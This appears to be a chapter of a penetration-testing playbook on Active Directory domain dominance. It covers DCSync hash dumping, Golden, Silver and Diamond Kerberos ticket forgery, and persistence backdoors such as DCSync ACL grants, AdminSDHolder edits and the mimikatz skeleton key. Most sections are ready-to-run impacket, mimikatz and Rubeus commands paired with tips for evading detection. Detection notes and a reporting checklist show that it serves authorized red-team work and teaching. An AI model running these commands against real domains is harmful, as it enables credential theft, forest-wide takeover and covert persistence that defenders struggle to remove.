---
title: "13 · Domain Dominance (DCSync, Golden, Silver)"
---

# 13 · Domain Dominance (DCSync, Golden, Silver)

> Once you have DA-equivalent rights, get the keys to the kingdom.

!!! note "Phase overview"
    `DCSync` uses MS-DRSR to ask a DC for password hashes (legitimate replication traffic). With the krbtgt hash, you forge Golden Tickets; TGTs that survive password resets and grant any user any privilege for up to 10 years. Silver Tickets are the stealthier cousin: TGS for one specific service, no DC interaction, hard to detect.

!!! tip "Mental model"
    - **DCSync** → harvest material (hashes, AES keys, SIDs)
    - **Golden** → forge a TGT (works against the entire domain, hits the DC)
    - **Silver** → forge a TGS (works against ONE service, never touches the DC)
    - **Diamond / Sapphire** → modern Golden variants that splice a real PAC into a forged TGT (better OPSEC)

---

### 13.1 · DCSync

!!! info "Why this works / how it chains"

    `secretsdump` speaks the DRSR protocol natively; no need to be on the DC, just need the rights. `-just-dc-user krbtgt` is the highest-value single dump because the krbtgt NT hash unlocks Golden Tickets. `-just-dc` dumps every user's hash without local SAM/registry hives. With Kerberos, prepend `KRB5CCNAME` and use `-k -no-pass`.

    Under the hood, the attacker invokes `DRSGetNCChanges` (and `DRSUAPI_REPLICA_OBJECT_OP`) the same RPC method legitimate DCs use to replicate `Active Directory` partitions. Because it's a normal AD replication call, no malicious binaries touch the DC and EDR on workstations sees nothing.

!!! warning "What leads here (who can DCSync)"
    Default principals that hold the right out of the box:

    - `Domain Admins`
    - `Enterprise Admins`
    - `Administrators` (BUILTIN, on the domain)
    - `Domain Controllers` (the DCs themselves)
    - `Read-only Domain Controllers` cannot DCSync the krbtgt secret (that's the whole point of RODCs)

    Custom paths to DCSync:

    - Any user/group granted ***`DS-Replication-Get-Changes`*** + ***`DS-Replication-Get-Changes-All`*** on the domain object
    - Sometimes ***`DS-Replication-Get-Changes-In-Filtered-Set`*** is also needed for confidential attributes
    - BloodHound query: `Find Principals with DCSync Rights` (canned query)
    - Cypher: `MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p`

!!! danger "Granting yourself DCSync (persistence)"
    If you have `WriteDACL` on the domain object, you can plant DCSync rights for any principal; a clean persistence backdoor that survives password resets:
    ```bash
    # Impacket
    impacket-dacledit -action write -rights DCSync \
      -principal lowpriv -target-dn 'DC=domain,DC=local' \
      domain.local/admin:pass

    # PowerView
    Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' \
      -PrincipalIdentity lowpriv -Rights DCSync
    ```

```bash title="DCSync variations"
# Some examples:

# Full domain dump
impacket-secretsdump domain.local/administrator:pass@<DC_IP>

# Just domain hashes
impacket-secretsdump -just-dc domain.local/administrator:pass@<DC_IP>

# Specific user
impacket-secretsdump -just-dc-user krbtgt domain.local/administrator:pass@<DC_IP>
impacket-secretsdump -just-dc-user administrator domain.local/administrator:pass@<DC_IP>

# With Kerberos
KRB5CCNAME=admin.ccache faketime '-7 seconds' \
  proxychains4 -q impacket-secretsdump \
  -k -no-pass -dc-ip <DC_IP> \
  -just-dc-user 'domain\targetuser' \
  domain.local/admin@dc.domain.local

# Mimikatz on DC
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv
```

```bash title="More secretsdump flags worth knowing"
# Skip Kerberos AES keys (NTLM only, smaller output)
impacket-secretsdump -just-dc-ntlm ...

# Include password history (great for password reuse / cracking)
impacket-secretsdump -just-dc -history ...

# Include user account status (enabled/disabled, pwdLastSet)
impacket-secretsdump -just-dc -user-status ...

# Save to disk (creates <prefix>.ntds, .sam, .secrets, .cached)
impacket-secretsdump -just-dc -outputfile loot/dump ...

# Use a hash instead of password (Pass-the-Hash to DCSync)
impacket-secretsdump -hashes :<NTHASH> domain.local/administrator@<DC_IP>

# Use AES key (Pass-the-Key)
impacket-secretsdump -aesKey <AES256> domain.local/administrator@<DC_IP>

# Through SOCKS / pivot
proxychains4 -q impacket-secretsdump -dc-ip <DC_IP> ...
```

```powershell title="Native / PowerShell alternatives"
# DSInternals (no third-party binaries on disk if used in-memory)
Install-Module DSInternals
Get-ADReplAccount -All -Server dc.domain.local | Out-File ntds.txt
Get-ADReplAccount -SamAccountName krbtgt -Domain domain -Server dc.domain.local

# Mimikatz (run as DA, off-DC also works)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:DOMAIN\krbtgt /authuser:admin /authpassword:pass /authdomain:domain.local
```

!!! tip "What you actually need from the dump"
    For Golden Tickets you only need three things:

    1. `krbtgt` NT hash (and ideally AES256 key for stealth)
    2. Domain SID (`S-1-5-21-...`)
    3. Domain FQDN

    For Silver Tickets you need the **service account's** hash (often a machine account: `MACHINE$:aes256_hmac` or `MACHINE$:NThash`). Machine account hashes rotate every 30 days by default : note the timestamp.

!!! danger "Detection / OPSEC"
    - **Event ID 4662** on the DC with the GUIDs `1131f6aa-...` (Get-Changes) or `1131f6ad-...` (Get-Changes-All) → classic DCSync signature
    - Network: DRSR/DCERPC traffic from a non-DC source IP is anomalous; defenders watch with Zeek/Suricata
    - Microsoft Defender for Identity (formerly Azure ATP) catches DCSync from non-DC accounts loudly
    - Do it from a host that already has a reason to talk to the DC (admin jumpbox), not from a workstation
    - Prefer single-user dumps (`-just-dc-user krbtgt`) over full DB dumps when you only need the master key : smaller footprint

### 13.2 · Golden Ticket

!!! info "Why this works / how it chains"

    `krbtgt`'s hash is the master key for forging TGTs. With it + the domain SID, `ticketer.py` forges a TGT for any user with any group memberships. `-duration 3650` = 10 years. Survives every password reset EXCEPT a krbtgt rotation (and then only after the second rotation, since AD keeps two krbtgt versions).

    A Golden Ticket is a TGT (Ticket-Granting Ticket) where the **PAC** (Privilege Attribute Certificate) is forged to claim membership in any group you want, typically Domain Admins (RID 512), Enterprise Admins (RID 519), Schema Admins (RID 518), Administrators (RID 544), Group Policy Creator Owners (RID 520). When you present it to the KDC asking for a service ticket, the KDC trusts the PAC because the TGT is signed with the krbtgt key.

!!! warning "Group RIDs to embed in the PAC"
    | Group | RID |
    |---|---|
    | Domain Users | 513 |
    | Domain Admins | 512 |
    | Enterprise Admins | 519 |
    | Schema Admins | 518 |
    | Administrators (BUILTIN) | 544 |
    | Group Policy Creator Owners | 520 |
    | Account Operators | 548 |
    | Server Operators | 549 |

    Default `ticketer.py` injects `513,512,520,518,519` that's usually enough.

```bash title="Forge + use Golden"
# Get domain SID first
impacket-getPac domain.local/administrator:pass -targetUser administrator

impacket-ticketer \
  -nthash <KRBTGT_HASH> \
  -domain-sid <S-1-5-21-XXXXX> \
  -domain domain.local \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
```

```bash title="Stealthier Golden (AES256 + custom PAC)"
# Use AES256 key instead of NT hash → no RC4-HMAC encryption type in
# the ticket, which avoids "encryption downgrade" detections.
impacket-ticketer \
  -aesKey <KRBTGT_AES256> \
  -domain-sid <SID> \
  -domain domain.local \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  -duration 3650 \
  fakeadmin

# Mimikatz equivalent (on a Windows attack box)
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local \
   /sid:<SID> /aes256:<KRBTGT_AES256> /id:500 \
   /groups:512,513,518,519,520 /ptt
```

!!! tip "Cross-domain Golden via SID history"
    If the target has a parent/child trust, embed the **Enterprise Admins** SID of the root domain into the child's Golden Ticket via `-extra-sid`. This grants you Enterprise Admin across the forest from a child-domain compromise.

    ```bash
    # Find root SID + add Enterprise Admins (-519) as extra SID
    impacket-ticketer \
      -nthash <CHILD_KRBTGT_HASH> \
      -domain-sid <CHILD_SID> \
      -domain child.domain.local \
      -extra-sid <ROOT_SID>-519 \
      administrator
    ```

```bash title="Using the forged TGT"
export KRB5CCNAME=$(pwd)/fakeadmin.ccache

# DCSync the parent domain with it
impacket-secretsdump -k -no-pass -just-dc \
  -dc-ip <ROOT_DC_IP> root.domain.local/[email protected]

# Lateral with Kerberos
impacket-psexec -k -no-pass domain.local/[email protected]
impacket-wmiexec -k -no-pass domain.local/[email protected]

# SMB / shares
impacket-smbclient -k -no-pass domain.local/[email protected]
```

!!! danger "krbtgt rotation behavior (why your Golden died)"
    AD stores **two** krbtgt password versions (current + previous) so tickets keep working during replication. To fully invalidate Golden Tickets, defenders must **reset the krbtgt password twice** with enough time between resets for replication. If only one reset has happened, your old Golden still works. Check the version with:

    ```powershell
    Get-ADUser krbtgt -Properties msDS-KeyVersionNumber
    ```

    A jump in `msDS-KeyVersionNumber` since you dumped = your ticket may be dead. Re-DCSync.

!!! danger "Detection / OPSEC"
    - **Event ID 4769** on the DC with anomalous account names, mismatched account-name vs SID, or accounts that have never logged in
    - Tickets with non-standard lifetimes (10 years vs the domain's policy of e.g. 10 hours) `klist` on the DC shows it
    - Tickets where the encryption type is `RC4-HMAC` while the domain mandates AES → use `-aesKey` to blend in
    - Defender for Identity flags PAC anomalies (group membership inconsistent with directory)
    - **Diamond / Sapphire tickets** (Rubeus `diamond` action) request a real TGT, decrypt it with the krbtgt key, edit the PAC, re-encrypt, and submit; the resulting ticket has a 100% legitimate-looking PAC. Much harder to detect than ticketer-style forgeries.

### 13.3 · Silver Ticket

!!! info "Why this works / how it chains"

    A Silver Ticket is a TGS for ONE service, signed with that service account's NT hash. The DC never sees this ticket that you craft it offline and present it directly to the target service. Stealthier than Golden but limited to the service whose hash you have. Works great with machine account hashes (`cifs/`, `host/`, `wsman/`).

    Because Kerberos service tickets are validated by the **service** using its own long-term key (the service account's NT hash or AES key), and because most services don't perform PAC validation against the DC by default, a forged TGS is accepted as authentic. No `4769` is logged on the DC because no TGS-REQ was made.

!!! warning "Common SPN → access mapping"
    Pick the SPN that matches what you want to do on the target. The **machine account hash** of `TARGET$` works for all the host-bound services on that machine.

    | SPN prefix | What it unlocks | Example tooling |
    |---|---|---|
    | `cifs/` | SMB file shares, admin shares (C$, ADMIN$) | `smbclient.py`, `psexec.py` |
    | `host/` | Scheduled tasks, services, most host operations | `schtasks`, `sc` |
    | `http/` | WinRM, IIS apps, WSMan | `evil-winrm`, `wmiexec.py` |
    | `wsman/` or `http/` | PowerShell Remoting | `evil-winrm` |
    | `mssqlsvc/` | MSSQL database access | `mssqlclient.py` |
    | `ldap/` | LDAP queries **and DCSync if hash is a DC's** | custom; effectively a Golden against that DC |
    | `time/` | Time service (rarely useful alone) | — |
    | `rpcss/` | DCOM / WMI (often paired with host/) | `dcomexec.py`, `wmiexec.py` |

```bash title="Forge a service-specific TGS"
impacket-ticketer \
  -nthash <MACHINE_OR_SERVICE_HASH> \
  -domain-sid <SID> \
  -domain domain.local \
  -spn cifs/target.domain.local \
  administrator
```

```bash title="Silver ticket recipes by service"
# SMB / file shares (CIFS)
impacket-ticketer -nthash <TARGET$_HASH> -domain-sid <SID> \
  -domain domain.local -spn cifs/target.domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass domain.local/[email protected]
impacket-psexec -k -no-pass domain.local/[email protected]

# WinRM / PowerShell Remoting (HTTP + WSMAN, sometimes need both)
impacket-ticketer -nthash <TARGET$_HASH> -domain-sid <SID> \
  -domain domain.local -spn http/target.domain.local administrator
evil-winrm -i target.domain.local -r domain.local

# MSSQL
impacket-ticketer -nthash <SQLSVC_HASH> -domain-sid <SID> \
  -domain domain.local -spn mssqlsvc/sqlsrv.domain.local:1433 administrator
impacket-mssqlclient -k -no-pass [email protected]

# LDAP on a DC = effectively DCSync (you have the DC machine hash)
impacket-ticketer -nthash <DC$_HASH> -domain-sid <SID> \
  -domain domain.local -spn ldap/dc.domain.local administrator
impacket-secretsdump -k -no-pass -just-dc domain.local/[email protected]

# Mimikatz equivalent (Windows)
mimikatz # kerberos::golden /user:administrator /domain:domain.local \
   /sid:<SID> /target:target.domain.local /service:cifs \
   /rc4:<TARGET$_NTLM> /ptt
```

```powershell title="Rubeus alternative (Windows attack host)"
# Forge a silver ticket directly into the current logon session
Rubeus.exe silver /user:administrator /domain:domain.local /sid:<SID> `
  /service:cifs/target.domain.local /rc4:<TARGET$_NTLM> /ptt

# Same with AES256 (stealthier)
Rubeus.exe silver /user:administrator /domain:domain.local /sid:<SID> `
  /service:cifs/target.domain.local /aes256:<TARGET$_AES256> /ptt

# Diamond (request real TGT, edit PAC, re-encrypt) modern Golden replacement
Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 `
  /groups:512,513,518,519,520 /krbkey:<KRBTGT_AES256> /ptt
```

!!! tip "Multiple SPNs / multiple services"
    A single ticket is bound to a single SPN. If you need both SMB and WinRM on the same host, forge two tickets (different SPNs) and switch `KRB5CCNAME` between them. On Windows, just `ptt` both; Windows picks the right one per service.

!!! danger "PAC validation gotcha"
    A small number of services (notably some MSSQL configs and any service explicitly enabling **PAC validation**) will round-trip the PAC to the DC for verification. If that happens, your forged Silver gets caught. In practice CIFS/HOST/HTTP rarely validate; MSSQL with `S4U2Self`-style flows can. If a Silver "fails for no reason," try a Golden against the same target.

!!! danger "Detection / OPSEC"
    - Silver tickets generate **no DC events** for the ticket forgery itself that's the whole point
    - However, the **service** logs a `4624` (logon) and possibly `4672` (special privileges assigned). Anomalous logons by a user who has never logged on before, or to a host they have no business on, is the giveaway
    - Machine account hashes rotate every 30 days (`MaximumPasswordAge` for computer accounts); your Silver dies on rotation. Re-dump the hash or escalate the service-account password change interval
    - To rotate manually as a defender: `Reset-ComputerMachinePassword` or just disable+enable the account
    - Match the encryption type: if the service ticket arriving is `RC4` but the rest of the domain is AES, that stands out: use `-aesKey`

---

### 13.4 · Cleanup, persistence and recovery

!!! tip "If you got Domain Admin, plant durable backdoors before you tear down"
    - **DCSync ACL backdoor** grant a low-priv user `GetChanges` + `GetChangesAll` (see §13.1)
    - **AdminSDHolder** modify the ACL on `CN=AdminSDHolder,CN=System,DC=...` so SDProp re-applies your rights to all protected groups every 60 minutes
    - **Skeleton key** (mimikatz `misc::skeleton`) patches LSASS on a DC so any account authenticates with a master password (RAM-only, dies on reboot)
    - **DSRM logon** set `DsrmAdminLogonBehavior=2` on a DC to allow the DSRM admin (whose hash you have from `secretsdump -sam`) to authenticate over the network
    - Re-DCSync periodically; krbtgt and machine accounts rotate

!!! warning "What "burned" looks like"
    - krbtgt rotated twice → all Golden Tickets dead
    - All privileged user passwords rotated → re-DCSync needed
    - Machine accounts rotated → Silver Tickets dead
    - Tier-0 reset (DCs rebuilt, KRBTGT reset, AdminSDHolder audited, ACLs reverted) → start over

!!! note "Reporting checklist"
    For the engagement writeup, capture:

    - Path from initial foothold → DCSync (kill chain)
    - Domain SID, krbtgt hash version (`msDS-KeyVersionNumber`) at time of dump
    - List of accounts dumped (and confirmation you stored hashes safely)
    - Any tickets forged with their lifetimes and SPNs
    - Cleanup actions performed (tickets purged from cache, ACL backdoors removed, etc.)
    - Recommendations: Tier-0 isolation, krbtgt rotation policy, DCSync auditing, PAC validation enforcement, AES-only Kerberos